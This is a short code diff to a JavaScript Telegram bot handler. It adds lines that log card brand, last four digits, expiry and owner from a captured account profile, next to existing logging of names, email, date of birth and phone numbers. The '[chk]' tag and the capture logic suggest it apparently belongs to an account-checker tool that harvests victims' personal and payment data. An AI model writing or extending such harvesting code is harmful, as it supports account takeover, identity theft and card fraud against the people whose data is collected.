@@ -229,6 +229,11 @@ function initializeTelegramHandler(botToken, options = {}) {
           if (capture.profile) {
             const phones = [capture.profile.mobilePhone, capture.profile.homePhone, capture.profile.fax].filter(Boolean).join('/') || 'n/a';
             log.info(`[chk] profile: name=${capture.profile.name} (${capture.profile.nameKana || ''}) email=${capture.profile.email} dob=${capture.profile.dob} phone=${phones}`);
+            if (capture.profile.cards && capture.profile.cards.length > 0) {
+              capture.profile.cards.forEach((card, idx) => {
+                log.info(`[chk] card[${idx}]: ${card.brand} ****${card.last4} exp=${card.expiry} owner=${card.owner}`);
+              });
+            }
           }
         } catch (captureErr) {
           log.warn(`[chk] capture failed: ${captureErr.message}`);
